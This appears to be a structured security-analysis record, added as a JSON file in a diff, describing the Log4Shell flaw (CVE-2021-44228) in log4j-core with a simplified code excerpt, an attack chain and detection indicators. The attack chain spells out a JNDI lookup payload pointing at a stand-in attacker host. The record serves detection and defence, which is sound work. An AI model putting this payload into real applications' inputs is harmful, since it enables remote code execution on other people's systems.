@@ -1,0 +1,82 @@
+{
+  "package_info": {
+    "package_name": "log4j-core",
+    "package_manager": "Maven",
+    "package_versions": "2.0-beta9 through 2.14.1",
+    "why_malicious": "The package contains a critical vulnerability (Log4Shell, CVE-2021-44228) that allows attacker-controlled input to be interpreted as a JNDI lookup within log messages, resulting in unauthenticated remote code execution. While not intentionally malicious by the maintainers, the outcome is a severe security risk that enables attackers to compromise affected systems."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when a log message is processed)",
+        "file_location": "core/src/main/java/org/apache/logging/log4j/core/Logger.java and related classes (e.g., PatternLayout, JndiManager)",
+        "required_permissions": [
+          "network (for outbound JNDI lookups)",
+          "environment_vars (for variable resolution)",
+          "JNDI access (for directory lookups and remote code loading)"
+        ]
+      },
+      "code_snippet": "private final Appender appender;\n\nprivate void tryCallAppender(final LogEvent e) {\n    try {\n        appender.append(e);\n    } catch (final RuntimeException error) {\n        // error handling\n    }\n}\n\n// In PatternLayout or similar:\npublic String toSerializable(final LogEvent event) {\n    // ...\n    return patternFormatter.format(event); // may trigger variable/JNDI lookups\n}\n\n// In JndiManager:\npublic Object lookup(String name) throws NamingException {\n    // ...\n    return context.lookup(name); // can trigger remote code loading\n}",
+      "code_language": "java",
+      "code_behavior": "At runtime, when a log message containing attacker-controlled input is processed, the code passes the LogEvent to the appender, which formats the message using PatternLayout. If the message contains a ${jndi:...} pattern, the code performs a JNDI lookup using the input, resulting in potential remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The code allows untrusted user input in log messages to be interpreted as JNDI lookup expressions, which can trigger network requests and load remote code. This creates a direct path from external input to dangerous code execution without validation or restriction.",
+        "violated_expectations": "Normal logging frameworks should treat log messages as inert data and never interpret user-controlled input as executable expressions or perform network lookups based on log content. Here, the code violates this expectation by evaluating log message content as JNDI expressions.",
+        "similar_legitimate_use": "Variable interpolation in log messages (e.g., inserting timestamps or environment variables) is a common feature, but it should not allow untrusted input to trigger network lookups or code execution. Legitimate use cases never involve evaluating user input as JNDI expressions.",
+        "key_indicators": [
+          "User-controlled data is passed directly to logging APIs",
+          "Log message formatting supports variable and JNDI expression interpolation",
+          "JNDI lookups are performed based on log message content",
+          "No sanitization or restriction on lookup patterns in log messages",
+          "Outbound network requests initiated from log message processing"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker submits a crafted input containing a ${jndi:ldap://attacker.com/a} pattern to an application using Log4j, causing the input to be included in a log message.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The log message containing the JNDI pattern is processed by Log4j's logging infrastructure."
+    },
+    {
+      "step": 2,
+      "action": "Log4j's PatternLayout detects the ${jndi:...} pattern in the log message and invokes the JndiManager to perform a JNDI lookup using the attacker-controlled URL.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "A network request is made to the attacker's server, and the response may contain malicious code or references."
+    },
+    {
+      "step": 3,
+      "action": "The Java process loads and executes code or retrieves data from the attacker's server as a result of the JNDI lookup.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Remote code execution or data exfiltration occurs, granting the attacker control or access to the system."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "User-controlled input containing ${jndi:...} patterns reaching logging functions",
+      "Log message parsing that supports variable interpolation and JNDI lookups",
+      "JNDI lookups triggered from log message content during runtime",
+      "Unexpected outbound network requests initiated during log processing"
+    ],
+    "file_indicators": [
+      "Presence of log4j-core-2.0-beta9 through log4j-core-2.14.1 JAR files",
+      "Custom or default PatternLayout usage in Log4j configuration",
+      "References to JndiManager or JNDI-related classes in application dependencies"
+    ],
+    "network_indicators": [
+      "Outbound LDAP, RMI, or other JNDI-related network requests from Java processes",
+      "DNS queries or connections to attacker-controlled domains specified in log message content",
+      "Unusual network activity originating from application servers during log processing"
+    ],
+    "how_to_detect": "Identify applications using vulnerable versions of log4j-core (2.0-beta9 through 2.14.1). Use static analysis to trace data flow from user input to logging APIs, especially where PatternLayout or variable interpolation is enabled. Monitor runtime logs and network activity for outbound JNDI-related requests (LDAP, RMI, etc.) initiated by Java processes, particularly those containing user-supplied values. Flag log messages or network requests containing suspicious ${jndi:...} patterns or connections to untrusted domains."
+  }
+}
